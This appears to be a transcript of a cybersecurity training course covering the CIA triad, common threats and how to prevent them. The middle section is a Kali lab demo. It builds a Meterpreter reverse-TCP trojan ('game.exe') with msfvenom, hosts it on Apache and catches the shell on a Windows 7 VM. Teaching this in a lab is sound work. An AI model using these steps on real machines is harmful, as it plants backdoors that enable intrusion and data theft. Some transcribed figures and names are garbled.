security there are three main pillars of
cyber security that we deal with since
the inception of computers and they're
known as the confidentiality integrity
and availability triad also known as cia
not to be confused with the american
intelligence agency but here we're
looking at three different pillars where
we want our data to remain confidential
the integrity of the data to be intact
and the data to be made available at all
points in time so let's talk about these
three aspects the principle of
confidentiality asserts that the
information and functions can be
accessed only by authorized parties so
for example even if you password protect
your file what is it that you're trying
to do you're trying to prevent other
users accessing your data and peeping
into your files so that your data
remains confidential it is only shared
with people who know the password
integrity this is where the
trustworthiness of that data comes into
the picture where if the data is going
to be changed for example you have a
spreadsheet which has a lot of
information about users
and their login activities and whatnot
and you want to ensure that that data is
not modified by any unauthorized user so
you're going to verify that the
information is correct and is not
modified by anybody who is unauthorized
the availability part ensures that this
data is made available to all authorized
users when and where they want it right
the principles of availability assert
that in systems functions and data must
be available on demand according to
agreed upon parameters based on levels
of service now this is where your
service level agreement should come in
for example when we log on to gmail we
always assume that gmail is going to
work and it's going to be available
online at no point in time or very few
times has it ever occurred that you've
gone on to the internet typed in
gmail.com and the website is not
available in fact if the website doesn't
open we figure out the internet is not
working right but gmail as a service is
always made available now when we talk
about threats to cia the confidentiality
integrity and availability we talk about
them in two different parameters cyber
crime and hacking so what is cyber crime
cyber crime is any criminal activity or
any unauthorized activity that would
involve the usage of any computing
device which would result as a security
incident at the victim's end most cyber
crimes are carried out in order to
profit from them criminals would try to
do phishing attacks to steal your money
out of your bank accounts or who try to
con you into giving out your credentials
thus compromising your email accounts or
your social media accounts and
try to gain access to your identity
cyber crimes are generally carried out
against computers or devices directly to
damage or disable them spread malware
secret and steal secret information etc
so this talks about the motivation part
of cyber crimes what would be the
motivational aspect for a person to
conduct such an activity right so
basically to cause damage like wannacry
happened in 2017 the perpetrators those
those used wannacry
probably gained a lot in the ransom that
they demanded for that data to be
decrypted but it also cost the world a
lot of money in profits that were lost
right let's move on to titling
cybercrime so what what do we mean by
cyber crime now again we if you remember
a few slides back a few topics back we
talked about information security and we
talked about cyber security and we
talked about the difference between both
of them information security could be
about anything normally contained within
the organization the data that the
organization has and us securing those
data by introducing the security
controls that we talked about cyber
security would be something that is on
the internet or on the web so any web
application that i have deployed on the
internet any databases that i have that
would talk about cyber security so if
your facebook account gets hacked or
your onedrive gets hacked that's where
cyber security comes into the picture
but if your physical computer gets
hacked because your password got cracked
by a physical attack that's where your
information security is so some of the
basic ways of preventing cyber attacks
on us use unique and strong passwords
we've just discussed the complexity of
the passwords we want to keep them
random they should not be guessable they
should not be based on dictionary words
and they should be randomized in such a
way that they cannot be predicted or
guessed the length of the password
should be very good should at least the
minimum bare minimum should be eight
characters even that is not suggested in
today's world it has to be at least 12
to 16 characters an operating system i
think in today's world will support up
to 24 or 26 characters if you go into
encryption softwares they support up to
60 odd characters of passwords so you
want to keep those unique you want to uh
recycle those passwords on a regular
basis you do not want to reuse old
passwords again and again avoid public
wi-fi that's a must we always look for
free wi-fi we go to coffee shops because
they advertise free wi-fi that's now it
nowadays a unique selling point uh for
uh coffee shops and uh establishments
and we go there we connect to the wi-fi
because we get free internet and we get
to serve whatever we want the problem is
you have no idea who else is connected
to that wi-fi and what kind of attacks
they are creating we will discuss wi-fi
attacks later on in one of the later
videos where i can demonstrate how these
attacks work but for now just remember
that public wi-fi's are very
risky and if your security is not up to
the mark um you might just end up
getting hacked like nobody's business
ignore and delete mails from unknown
senders phishing attacks very common
attacks in today's world you get an
email saying you've won a lottery or
you've been chosen for something or
please don't click here to download your
free software and something like that
and those emails are plenty nowadays i
received an email yesterday where there
was a nigerian prince
who had died and he had left around 500
million dollars behind and there was
this accountant who wanted to smuggle
that money out and it was a huge email
giving me all the details and out of
seven billion people on this planet they
identified my email address and they
wanted to share half the money with me
so that they can masquerade the money
and avoid paying taxes inheritance taxes
and whatnot it was a ridiculous scheme i
mean being chosen out of seven billion
one out of seven billion um i mean our
luck can't be that good can it so you
have to be very about these attacks
always ask the question if you want a
lottery did you purchase the ticket no
so there's never a free lunch right so
always keep on questioning the things
that you've been getting i'm not saying
ignore them because some of them may
actually come true there's always that
one percent hope but always investigate
those things to see whether they are
spam if there is a fraud going on and if
yes you yourself can uh communicate with
the law enforcement agency and try to
figure out who is responsible for that
fraud make use of antivirus software and
always keep it updated again uh let's
not go for the free antivirus softwares
because they have they may be good at
detecting infections but when they come
for the disinfecting those files then
that's where they ask for money and
that's when you're going to
run around and say okay let me see which
is the which is a very good antivirus to
disinfect this kind of a infection so uh
there are a lot of antiviruses out there
i know that and it's very confusing
which is the best one today now the
problem is whichever is the best one in
the market may not be the best one for
the operating system that you're using
for example i mean some uh there would
be a good antivirus for windows 7 but
the same antivirus installed on windows
8 or windows 10 wouldn't be that
effective so always do an investigation
the best way to look at antiviruses and
identifying which antivirus suits you is
to investigate that antivirus and see
the detection rate of that antivirus see
how often does it detect
the infections that you're looking at
what you can do is you can head on to a
website called virustotal.com that's v i
r u s t o t a l dot com it's a google
owned website they have around 60 to 70
odd scanners on that website most of the
known antivirus scanners are there try
to figure out uh try to see if you can
get hold of an infected file be very
careful you don't want to get infected
yourself or i mean your computer you can
upload it to that particular website and
analyze that file and see which
antivirus detects those kind of viruses
a few files are few infections over here
and there and you will come to know
which antiviruses would work for you use
multi-factor authentication or two-step
processes for authentication just don't
rely on a username and password
registered devices get otps either on
your email or on your devices and that
gives you an added layer of security if
your password gets compromised that's
still okay because now the hacker will
need to simulate your phone as well so
that's added uh headaches and it may
just not be worth it there are so many
other people who don't use these kind of
techniques who can be hacked much easily
than people who have an added layer of
security introduced and be very careful
when you're downloading apps now when we
say applications on your mobile phones
as well as in your computers on your
mobile phone you still have a certain
level of security where you can go to
the apple marketplace or whatever it is
called the google marketplace or
whatever it is called and they do have
some level of control but when you talk
about windows operating systems and
you're going on to the open internet to
look for different kinds of softwares
you have no idea whether the website
that you're on is trustworthy or is
hosted by a hacker with a malware on
that particular file that you're
downloading especially if you're
downloading a pirated program never
download a pirated program so be very
careful when you're downloading apps uh
when you're downloading an executable
file you can upload it to virustotal.exe
scan it to see if there are any viruses
or malwares within it the website also
helps you analyze urls to see if the url
itself may have any malicious attacks
within them embedded scripts or
redirected scripts or things like that
so you can use those that website uh to
scan for scan the apps that you're
downloading and see if there is anything
malicious about those apps moving on to
cyber crime statistics now this is going
to be interesting let's talk about how
these things uh and the percentile of
these things in today's world by 2020 we
would have generated 300 billion
passwords
now the human population on this planet
is 7 billion imagine 7 billion having
300 billion passwords and i think half
the population wouldn't have access to
computers on the internet either so
imagine the number of passwords that we
have and that's what makes us use easy
passwords makes us repeat those
passwords and makes and we use a single
password for multiple accounts right
because there are just so many passwords
that we have to remember but that's the
way it is and if we want to keep
ourselves secure we are responsible for
it so please be very careful with those
passwords 24 000 malicious mobile apps
blocked daily in fact the latest example
that i can give give you i use an
android phone and there's an application
that i've always used called cam scanner
and recently just three days back my
mobile phone started telling me that it
is a malicious app right i've been using
it for years now probably three or four
years maybe more what is the software
you can click pictures of a document it
will automatically convert it it will
it will beautify it if that's a word
convert it into a pdf and i can then
send it as an attachment via email a
very handy app for me or was an handy
app for me it worked beautifully but
three days back suddenly
uh the android operating system and my
antivirus on my
android phone started reporting it as a
malicious software so i went online and
i checked into it and it seemed that
over a period of time the developers
changed their vision of that software
made it spyware and then there was a
dropper involved within that application
which would then download a malware from
a third party server install it and
start spying on you and start showing
you malicious advertisements right so
this was an existing app which was
trusted over a period of years and over
a period of time slowly they modified it
into a spyware kaspersky was an
organization that detected it in the
first place and then pointed it out to
google google took it off the google
play market and now there is a variant
of it available but if you look at the
reviews all of them are one stars where
they have identified that this is the
malware now and it spies on them and it
actually compromised some people's data
so that's the latest example in 2017 or
18 there were 700 000 apps during that
year that were identified by google as
malicious apps and were deleted from
google play so even if they're published
there will be thousands of people who
will download it till the time google
realizes that it is a malware and then
deletes it till then you've already been
compromised and there is no way to
protect yourself now so be very careful
when you download these applications in
the healthcare sector ransomware attacks
will quadruple now the healthcare sector
is a very volatile sector it contains a
lot of private and sensitive information
health information about individuals
that can be misused by a lot of
organizations advertisements
pharmaceutical organizations life
insurance people and whatnot right so
these become very lucrative targets for
hackers where if they can steal the
database and sell it on the black market
they will earn a lot of money
ransomwares would basically work the
other way around they encrypt the data
at the hospital side and then they will
hold the hospital ransom to pay up now
you know how hospitals earn nowadays
right so that's a lot of money that
you're looking at cyber crime would cost
up to six trillion dollars in 2021 six
trillion dollars just for cyber crime we
are not talking about the income from
the iit industry we are talking about
how much money we will lose to cyber
crime because of the various attacks
that we that would be created 90 percent
of hackers use encryption not only
encryption most of the advanced hackers
will try to hide their identity by
spoofing their ip addresses mac
addresses locations they will use
encryption and cryptography to hide
their malicious softwares to fool the
antiviruses idss ips's and it would it
is a very difficult task to even
identify a particular malware analyze it
and then do a root cause analysis and
try to figure out who the responsible
hacker was so it's a very intensive task
of doing so such things and most of the
hackers would go scot free because it is
very difficult to identify them now
let's move on to the demo it's a very
interesting demo we are using metasploit
which is a penetration testing tool and
we are going to use a demo of using
metasploit we are going to try to
compromise the security of a particular
system well let's discuss the demo
before we start executing it so what we
have done here is that we have two
virtual machines on vmware workstation
one is the kali linux machine and the
other is a windows 7 machine what we are
going to do is we are going to use a
penetration testing tool called
metasploit which is available freely on
kali linux and we are going to use a
particular payload generator on
metasploit called msfv venom and using
msf venom we are going to create a back
door a executable file which will
contain a trojan or a backdoor and and
we're going to try to infect that to the
windows machine and see what happens
when the victim executes that particular
file now we are going to keep it at the
basic level we're just going to create
the trojan and then we're going to
execute it in a later lecture or in a
later video we'll see how we can mask
that trojan into a legitimate looking
application so that a victim can be
fooled by the application that we're
going to execute so let's start with the
demo all right so this is the kali linux
vm and the other machine is a windows 7
virtual machine so what we are going to
do is on the kali linux machine we are
going to just open up a command prompt
right it's just regular command prompt
your regular commands and what we are
going to do is we are going to use the
msf venom payload generator from
metasploit to create a game.exe file now
the trojan is will be contained within
the game.exe so the command goes as such
msf venom hyphen p for platform we want
it or rather payload at this point in
time we want the payload to be windows
meterpreter reverse underscore tcp l
host and the ip address for the
localhost i'll explain the command once
i've typed it let's just check what our
ip address for this machine is and we
have 192 168 71.133
and that's what we're going to type in
here 192. 192 168
71.133 l port 4444 hyphen f exe hyphen a
x 86 and we want that output in root
desktop and we want it as game.exe so
let's go through the command the msf
venom is the initiator command it
invokes the payload generator in
metasploit hyphen p is the payload we
want windows printer reverse tcp so what
is the reverse tcp here the meter reader
allows us for remote code execution
where we are going to create the payload
we are going to execute the payload at
the victims and and the payload will
then generate a connection back to us
us being the hacker's machine and thus
the local host which is the ip address
of this machine which is the hackers
machine that we are using right now
which is 192.168.71.133
that's why we have typed in the local
host and l port is the local port on
which port do we want to listen in or we
want the payload to connect to the local
host so what we're doing is the meter
printer allows us remote code execution
we create the game.exe we execute it at
the victim's end it is pre-coded to
connect to a local host the ip address
is coded over there to a particular port
which in this case is 444. you can put
in any port number you want just ensure
that the port is going to be free and it
is not a regularly used port otherwise
you're going to get problems over there
so at this point in time you're going to
keep it as 444. hyphen f stands for
function we got an executable file
hyphen a stands for the architecture
here the architecture is 886 which is
x86 which is 32-bit and we are going to
export it and we are going to host it or
we are going to create the file on root
desktop and we are logged in as root as
you can see at the prompt so when i
press enter i should see a game.exe
popping up right about here on my
desktop if the command is correct which
it should be and that's game.exe wait
for it to be compiled properly so there
you can see platform windows for payload
no encoder a payload size 33 333 bytes
and final size of executable file is 73
800 and 00 802 bytes so now we have
created game.exe now we are not going to
convert this into or we are not going to
merge this into a malware and things
like that we are going to keep it simple
so to keep it simple what i'm going to
do is as a hacker i'm going to host this
on a server which is going to be on the
same machine right so when we say we
want to host an apache server the server
is hosted in a directory called slash
var bar slash www so let's go there
present working directory uh we can see
that we are in root cd where www and
there we are cdhtml and that is where
our web servers would be so what we are
going to do is we are going to create a
directory mkdir shared right to an ls
and you can see the shared folder right
here ls hyphen al will give you the list
and the attributes and we can see these
attributes we want to change this
attribute so we are going to use a chmod
recursive command give the permissions
as 755 to the folder
shared since we are in the same
directory we do not need to give the
path for shared let's just verify it and
you can see the permissions being
changed and now what we are going to do
is we are going to change the ownership
from root to www hyphen data for the web
hosting so ch own for change ownership
recursive www hyphen data colon www
hyphen data to shared all right let's
check if that's been done properly and
you can see that earlier it was root
root and now it is dub dub dub hyphen
data www right and so that's the
directory that's that we have created
let's go back uh what we want to do is
we want to copy
dot exe into this folder so
cp
root desktop game dot exe where dub dub
dub html shared and cd shared let's see
we have game dot exe there there it is
and now what we want to do is service
apache to
start so essentially what we have done
is we have created a directory in the
html folder to host this file and we
have copied it from our desktop into the
shared folder and i'm going to pause
here for a minute all right so uh we
have started the service for the apache
2 server that means we have started the
web server we have hosted the game.exe
on the web server in the shared folder
we have changed the permissions and the
ownership for the shared folder now we
are going to go on to the windows 7
machine and we are going to open up the
browser and see if the web server is now
accessible so if you remember the ip
address of that machine was
192.168.71.133 and we have we were in
the shared folder 92 168
71.133 shared and if this is done
properly we should see the game.exe
right here and once we click on it it's
going to ask us whether we want to save
the file 72.1 kb we're going to save it
and i'm going to save it on i think it
just saved it here and now before we
execute it we're going to go back into
kali linux and we are now going to start
the listener right so we have created
the exploit we've created the payload
rather we have hosted it onto a web
server which means that when somebody
double clicks on it the machine is going
to try to create a reverse connection to
our hackers machine but our hacker's
machine needs to be configured to handle
that incoming connection so we are going
to start off with msf console now msf
console is the command which starts up
metasploit right so we're just going to
take a minute over here uh you can see
it's metasploit framework control it's
going to start it's
uh does take a little bit of a while and
we're just going to wait it out let me
turn this into full screen i can see at
the bottom left you're on msf con on the
msf prompt we are using metasploit with
1 699 exploits now this is not the
completely updated version the latest
one would have around 1800 exploits but
the one that we want is uh exists in
this version so that we are good to go
so we start off with the configuration
of metasploit to listen in on to that
particular connection so we say use
exploit multi handler and when you say
multi multi is basically something that
affects multiple operating system and
we're going to use that exploit and you
can see uh it's now opening up the
handler which we need to configure and
here we're going to set the payload that
it is going to expect the payload being
windows meter preter reverse underscore
tcp i can see that the payload has been
configured we are going to say show
options and you'll see it is going to
ask us options
for the payload which means the
localhost the listen address and the
listing port and you can see we have by
default given 444 which is the default
port for this exploit within metasploit
if you want to change if you have
changed the port when you created
game.exe you need to change the port
over here as well and the commands here
that says set lhost equals
192.168.71.133
enter and i think i did a typo so uh
there's no equal to that's it and you
can see now it shows the equal to mark
and we have now set the local host if we
want to set the l port that's how we do
it we had four four four four and there
it is so if you have changed the port in
the game.exe ensure that you change the
port here as well show options and
you'll see now the data is populated
over here lhost which is the localhost
is
192.168.71.133 and l port the local port
is 444. we have configured this and now
what we're going to do is we're just
going to type in exploit and now you can
see that it has started the reverse tcp
handler on 192 168 71.13
on port 444 so now when the victim which
is windows 7 executes the file and we
say run at the victim's end there's
nothing that should happen uh it's just
resolving something and at the at the
other end you can see that a meet
operator station has been opened and it
shows us that from the victims ip which
is 71.129
on port 49493 we are connected to our
machine so that's that's the connection
that has happened press enter and you
can see it exists exits the session
let's just look at the ip address on
windows to confirm that was the same
machine that we had and that's 129 right
there it is
let's
open up this file again and see what
happens and you can see the second
session being opened up right here to a
pwd and you can see that we were
connected to that particular website
right so that's what uh this uh trojans
are supposed to do give us a backdoor
entry and we then uh are able to connect
and we are able to copy data and we are
able to basically we have a back door so
we can do anything and everything that
we want to do
just like how the code 19 situation is
affecting various domains it is also
adversely affecting cyber security
interpol states that attackers are
attacking computer networks and systems
of businesses individuals and big global
organizations
due to the shift of focus to the kovich
crisis cyber security is taking a huge
brunt
even who has stated that from the
beginning of this pandemic it has
witnessed a sky-high increase in the
number of cyber attacks there are fake
emails doing the rounds in which
scammers are impersonating w head show
reports also state that the financial
services sector is increasingly being
targeted during the covet 19 coronavirus
pandemic
various banks and financial institutions
have witnessed a spike in the number of
cyber attacks in the last few months
several banks are increasing cyber
attack awareness amongst their customers
and also asking them not to disclose any
confidential information to a third
party now that we have an idea as to how
cyber attacks can affect us let's go
ahead and understand the meaning of a
cyber threat
a cyber threat is a warning which allows
you to prepare against a cyber attack
when there is an unauthorized access by
a third party to your system and network
it is termed as a cyber attack the
person who carries this out is termed as
a hacker or an attacker or a cyber
criminal
a possibility of such an attack is
termed as a cyber threat
as we saw previously cyber attacks lead
to data breaches which result in either
data manipulation or loss of highly
confidential data
it also results in financial losses and
which in turn has a colossal impact on
the businesses
in addition to these losses lot of
companies face reputational damages as
well trust plays a vital role when it
comes to customer relationships cyber
attacks can hamper an organization's
reputation and erode the customer's
trust
let's now get an understanding of the
most common cyber attacks here we will
look into the top 10 cyber threats in
today's times
first up we have the malware attack
this is a very common form of cyber
attack the term malware refers to
malicious software virus including
spyware worms ransomware adware and
trojans
trojan virus is a form of malware that
disguises itself as a legitimate
software
ransomware blocks access to the key
components of the network whereas
spyware as the name suggests is a
software that steals your confidential
data without your knowledge
coming to adware it is also a software
but this software displays advertising
content such as banners or pop-ups on a
user screen
marvel breaches a network through a
vulnerability it usually happens when
the victim clicks a dangerous link or
downloads an email attachment or also
when an infected pen drive is used
let's now have a look at the ways in
which we can prevent a malware attack
first and foremost you should use any
kind of an antivirus software this step
might be something that you have heard
time and again but it is a very
effective way to prevent a malware
attack
anti-virus software is a program that
can protect your computer against the
above-mentioned viruses
this data security utility installed in
a computer can prevent a malware attack
few of the popular antivirus software
are avast antivirus not an antivirus and
mcafee antivirus
secondly you should use firewalls a
firewall helps prevent an unauthorized
taxes viruses and other malicious
activities that occur over the internet
as the name suggests it acts as a wall
between your system and the internet
it filters a traffic that is allowed to
enter your device
windows and mac os 10 have their default
built-in firewalls named as windows
firewall and mac firewall respectively
apart from this in order to prevent
attacks on your network your router
should also have a firewall built in
thirdly you should always stay alert and
avoid clicking on suspicious links the
links might look to be legitimate but
they can be home to malware which is
going to enter your system and cause a
havoc
lastly it is wise to update operating
systems and browsers regularly if this
is not done cyber criminals can exploit
these vulnerabilities and attack your
system that was all about preventing a
malware attack
let's move on to the next attack it is
the phishing attack
it is one of the biggest widespread
types of cyber attacks as per reports
fishing accounts for over 12 billion
dollars in business losses
so what is a phishing attack it is an
attack wherein an attacker impersonates
to be a trusted contact and sends the
victim fake emails
unaware of this the victim opens the
email and clicks on the malicious link
or opens the attachment in the mail
the aim of such an attack is to gain
access to confidential information and
account credentials
hackers can also install malware through
a phishing attack
this attack is growing bigger each day
as attackers are becoming more
convincing in pretending to be a trusted
source
for example you might get an email from
apple stating that your apple account is
kept on hold for security reasons and
the mail will ask you to type in your
login credentials in order to restore
your account
do not fall for that as it is a phishing
email
legitimate sources will not randomly
send you mails and ask for your account
credentials
phishing is a type of social engineering
attack social engineering attacks refer
to several malicious activities that are
obtained through human interactions
it manipulates the victim in such a way
that he or she ends up divulging
personal information
such an attack can happen on any
platform such as text messages or even
on social media sites
similar to phishing you also have voice
phishing known as wishing wishing will
be carried out over a voice email or
mobile phone or even over landlines
so how do we prevent a phishing attack
human error is the reason for a high
percentage of cyber attacks to prevent a
phishing attack the wisest way will be
to scrutinize the emails you receive
a phishing email will have some spelling
mistakes or a format change from that of
the legitimate source it is pretending
to come from
look for these loopholes and do not
click any sub-suspicious emails
next you can also make use of an
anti-phishing toolbar sometimes when it
is impossible to identify a phishing
email this toolbar is helpful
it is a tool that provides you with
anti-phishing solutions and information
about the website you are browsing
they prevent fraudulent websites from
masquerading as other legitimate
websites for example avast online
security is a good anti-phishing toolbar
you can get
you should also make it a habit to
update your passwords regularly this way
even if your own password is known to a
third party it will still be invalid
let's now move on to the next type of
cyber attack that is the password attack
this is a form of attack most of us
might have experienced at some point in
time imagine when you try to log into an
account and it says incorrect password
in such a scenario it is possible that
an outsider has managed to either guess
or steal your password
by doing so all your data is compromised
a hacker can crack your password with
the help of various programs and
password tracking tools like aircrack
cane enable john ripper hashcat and so
on
there are different types of password
attacks
a brute force attack happens when the
hacker tries to login with all possible
password combinations
meanwhile in the dictionary attack a
list of common passwords is used to
crack the user's login credentials
next is a keylogger attack keystroke
logging records the keys struck on a
keyboard by the victim and the victim is
totally ignorant of this this keylogger
or a keystroke recorder can either be a
hardware or a software
speaking of how one can prevent password
attacks it is crucial that you use
alphanumeric passwords which are strong
incorporate special characters in your
passwords as well
it is to be noted that you shouldn't be
using the same password for multiple
websites or accounts
also make sure to not use easily
guessable passwords which includes your
name or your family members names or
even your date of birth
needless to say update your passwords
regularly this will limit your exposure
to a password attack
the next tip is something we should all
be careful about often we make
complicated passwords and to remember
them we noted down somewhere or keep
some sort of a password hint in the open
this shouldn't be done in the open as
this can prove to be a gateway to an
attack as a third party can misuse your
account with the help of your password
hint
let's now move on and have a look at the
fourth type of cyber attack on our list
that is the man in the middle attack
as you can see on your screens we have
the client on the left the server on the
right and the hacker below
and now you can see that the client
server communication has been cut off
and instead the communication line now
goes through the hacker
so let's elaborate on this
in the middle attack is also known as
eavesdropping attack it takes place when
an attacker comes in between a two-party
communication
in other words the attacker hijacks the
session between a client and host
so what do they gain by interrupting the
session well they are able to steal and
also filter data imagine you are logging
into your bank account in such a state a
man in the middle attack can be used to
obtain information related to your bank
account
let's now have a look at how we can
prevent man in the middle attack
firstly you should be aware of the
security of the website you are using
and it is advised to use encryption on
all devices that contain crucial data
using an unsecure public wi-fi can help
attackers carry out the man in the
middle attack hence it is suggested that
you avoid using public wi-fi's to carry
out important work
next attack that we will be talking
about is the sql injection attack
a structured query language sql
injection occurs in a database driven
website when the hacker manipulates a
standard sql query
this attack can be carried out by
submitting a malicious code into a
vulnerable website search box thereby
making the server reveal information
the outcome of this attack is that the
attacker is able to view edit and delete
tables in the databases in addition to
this the attackers can also obtain
administrator rights
an sql attack manipulates data and
accesses confidential information
in order to prevent a sql injection
attack you should use an intrusion
detection system an ids is designed to
detect unauthorized access to a system
it is used together with a firewall and
a router this way unwanted requests can
be filtered out
the next step is to carry out a
validation of the user supplied data
there are codes that are developed to
identify illegal user inputs the
validation process helps in verifying
whether or not the type of user input is
allowed or not
this way only that value which passes
the validation will be processed
that was all about the sql injection
attack
so now that we have reached midway i'd
like to remind you all to feel free to
leave your questions in our chat section
and we will be happy to answer them
without further ado let's go back to our
list of the top cyber security threats
at number six we have the denial of
service attack
this is a type of attack that proves to
be a major threat to companies in this
attack malicious parties target systems
servers or networks and then flood them
with traffic so as to exhaust their
resources and bandwidth
as a result the server is unable to
handle incoming requests and thereby
resulting in the website it hosts to
either slow down or shut down
this leaves legitimate service requests
unattended it is known as distributor
denial of service ddos when attackers
use multiple compromise systems to
launch this attack
like i mentioned earlier the ddos attack
is a major threat to organizations let's
have a look at one such ddos attack
in february 2018 the famous united
states-based global company github
revealed that it was hit with the
distributor denial of service attack
ddos attack
this ddos attack is considered to be the
world's largest edos attack as you might
be aware github is a developer platform
used by millions all over the world
hence it always has high traffic and
usage
but this time it wasn't just high
traffic but a whopping 1.35 terabits per
second sending packets at a rate of
126.9 million per second
these figures speak for itself
fortunately github was running a ddos
protection service which was
automatically alerted within 10 minutes
of the start of the attack
this attack only took github systems
down for about 15 to 20 minutes github
was able to stop the attack quickly only
because it utilized a ddos mitigation
service that helped in detecting the
attack and which further helped in
quickly taking the necessary steps to
minimize the impact
let's now have a look at how to prevent
a ddos attack
firstly to stop a ddos attack you're
required to identify the malicious
traffic this can be made possible by
running a traffic analysis
also remember to comprehend the warning
signs
few symptoms of a ddos attack include
network slowdown intermittent website
shutdowns etc
if anything seems irregular and unusual
then the organization should do the
needful
secondly understand that every
organization can face a ddos attack and
be ready with a prevention plan as there
won't be any time to prepare one when it
hits
for this purpose develop an incident
response plan have a checklist and make
sure your team and data center is
prepared
if you are well prepared you can tackle
a ddos attack smoothly like how github
did
lastly the conventional ddos mitigation
solutions oversize the network bandwidth
and require complex hardware which
proves to be costly and also ineffective
whereas cloud has greater bandwidth and
resources
it is also to be noted that cloud-based
apps can absorb malicious traffic way
before it reaches its intended
destination
hence it is good to outsource ddos
prevention to cloud-based service
providers
that was all about the ddos attack
now let's look at number seven and here
we have the insider thread
and inside our thread as the name
suggests is one that does not involve a
third party but an insider it could be
someone from the organization who knows
everything about the organization
it could be current employees former
employees contractors or even associates
these threats have the potential to
cause huge damages
researchers show that insider threats
are growing in small businesses as
employees have access to multiple
accounts that have a lot of data
the individuals who misuse this data can
put everyone else at risk
reasons for such security breaches are
many it can be due to malice greed or
even carelessness
such a threat is quite tricky as these
attacks are hard to predict
in order to prevent the insider threat
attack thorough preparation is required
organizations should make sure that they
have a good culture of security
awareness businesses can limit the id
resources a user can have access to
depending on their job rules this way
the damage of cost can be minimized
all the employees should be trained to
identify insider threats and this way
employees can understand when an
attacker has manipulated or is
attempting to misuse the company data
next up in our list is crypto jacking
which is at number eight
i'm sure most of you are aware of the
word cryptocurrency crypto tracking is
related to cryptocurrency you must be
wondering how let's understand what is
crypto jacking
crypto jacking takes place when
attackers make their way into someone
else's computer to mine cryptocurrency
this is done by infecting a website or
by manipulating the victim to click on a
malicious link which in turn loads
crypto mining code on the computer
it is also done through online ads with
javascript code that will auto execute
once loader in the victim's browser
victims are unaware of this as the
crypto mining code works in the
background the only sign they might
witness is a delay in the execution
crypto mining is a form of obtaining
cryptocurrency crypto mining by itself
is an immense process that is the reason
attackers make use of other computers in
order to cryptomine
let's have a look at ways to prevent
crypto jacking it is advised that you
keep all security apps and software
updated to the latest versions as
cryptojacking can infect the most
unprotected systems
it is also good to have a cryptojacking
awareness training and give tips to
employees as to how to detect
cryptojacking threats
make sure to inform them about the risks
of opening emails from unknown senders
and clicking on attachments
ads are a primary source of crypto
tracking scripts
therefore it's good to install an ad
blocker and also have extensions like
miner blog which is used to detect and
block crypto mining scripts
moving on to the number nine on our list
we have the zero day exploit
a zero-day exploit occurs after the
announcement of a network vulnerability
usually the winter becomes aware of a
vulnerability but a solution to it is
still not available for the scene hence
the vendor announces the vulnerability
so that the users are aware of it but
this also makes the attackers aware of
it
the vendor or the developer could take
any amount of time to find a solution it
could vary from a few hours to days to
months depending on the vulnerability
in the meantime the attackers target the
disclose vulnerability they exploit the
vulnerability even before a patch or a
solution is implemented
speaking of ways to prevent 0d exploit
organizations should have a well
communicated patch management process it
is also crucial to use management
solutions to automate the procedures
thus it avoids delays and deployment
having an incident response plan helps
in dealing with a cyber attack you need
to have a plan primarily looking into
zero day attacks in case of an attack
this plan will keep you prepared and
will allow you to avoid or reduce the
damage
finally at number 10 we have the
watering hole attack
generally in a watering hole attack the
victim is of a specific group it could
be either victims of an organization or
a region or so on
here the attacker targets the websites
which are frequently used by the
particular group they identify these
websites either by guesswork or by
closely monitoring the group
after which the attackers infect a few
of these websites with malware and
anyone who happens to visit the infected
website will have their computers
automatically loaded with malware
this attack loads the victim system with
malware similar to the phishing attack
the malware in such an attack targets
personal information off the victim
there is also a possibility that the
hacker will actively take control of the
infected computer
let's have a look at how we can prevent
the watering hole attack
just like most other cyber attack
prevention methods in this attack as
well it is strongly suggested that you
regularly update your software
by doing so you can reduce the risk of
this attack as this attack most often
exploits vulnerabilities
also make sure to regularly check for
any security patches
make use of your network security tools
to detect watering hole attacks
intrusion prevention systems work finely
when it comes to detecting a suspicious
act
similarly you can conduct regular
security checks using various network
security tools
to prevent a watering hole attack it is
good to conceal your online activities
this can be done with the help of a vpn
and also through your browser's private
browsing feature
a virtual private network often called a
vpn provides a secure connection to
another network over the internet it
acts as a cover to your browsing
activity not vpn is an example of a vpn
that can be used to provide a secure
connection
so those were all about the different
types of cyber threats cyber security is
implemented in order to put a curb on
these cyber attacks cyber security
refers to the practice of protecting
networks computer systems and their
components from unauthorized digital
access
according to the gartner forecast
worldwide it is stated that the
worldwide spending on cyber security is
forecasted to reach
133.7 billion dollars in 2022
and according to the university of
maryland hackers attack every 39 seconds
that is on an average 2
244 times a day
although we had a look at multiple
methods to prevent a cyber attack let's
once again have a look at a few personal
tips and ways in which you can prevent a
cypher attack on the whole
firstly it is important you change your
passwords regularly and not only change
but use strong passwords that are
difficult to crack
do not have extremely complicated
passwords that you would tend to forget
rather use a password with at least
eight characters and preferably
alphanumeric also keep in mind not to
use the same password twice
next update both your operating system
and applications this will remove
vulnerabilities that hackers tend to
exploit make use of antivirus protection
software as they prevent malware and
other viruses from entering into your
device
use antivirus software from trusted and
legitimate vendors only
make sure to use a firewall as it will
filter the traffic entering your device
use other network security tools such as
intrusion prevention systems access
control application security and so on
fourthly as mentioned in the earlier
section don't open emails from unknown
centers scrutinize the emails that you
receive and see where it comes from and
if there are any grammatical or format
errors
ideally it is good to make use of a vpn
by doing so the traffic is encrypted
between the vpn server and your device
this proves to be a protection for your
device
the next step is that you regularly
backup your data
according to many security professionals
it is good to have three copies of your
data on two different types of media and
one copy in an offsite location like a
cloud storage
this way even if you witness a cyber
attack you can erase your systems and
restore with a recently performed backup
up next is that you should train your
employees in cyber security principles
they should also be aware of the various
cyber threats and know how to tackle
them in case of any emergency
the next one is a crucial step and that
is to make sure to use two-factor or
multi-factor authentication
normally by logging in you would enter
your user id and password but with
two-factor authentication users are
required to provide two different
authentication factors to verify
themselves it could be an additional
personal identification code or maybe
even a fingerprint when you are asked
for more than two additional
authentication methods apart from your
username and password it is termed as a
multi-factor authentication thus it
proves to be a better step to secure
your account
make sure to always secure your wi-fi
networks the next point is that refrain
from using public wi-fi without using a
virtual private network that is a vpn
finally it is also necessary that you
safeguard your mobile as mobiles are
also a cyber attack target
for this purpose install apps from only
trusted and legitimate sources make sure
to keep your device updated
and there you go those were a few of the
cyber security tips and ways to prevent
a cyber attack
let's start off with a few interesting
facts about ddos attacks
cybercrime magazine stated that the
total number of ddos attacks globally
are anticipated to double to 14.5
million by 2022. now that's a huge
number isn't it
also given the current situation with
the covet 19 pandemic every sector is
operating virtually thus the attacks are
growing more significantly than normal
do you know the financial brunt of ddos
attack causes once again according to
cybercrime magazine a denial of service
or a ddos attack could cost up to
and twenty thousand dollars for a small
company or more than two million dollars
for a larger one with financial loss
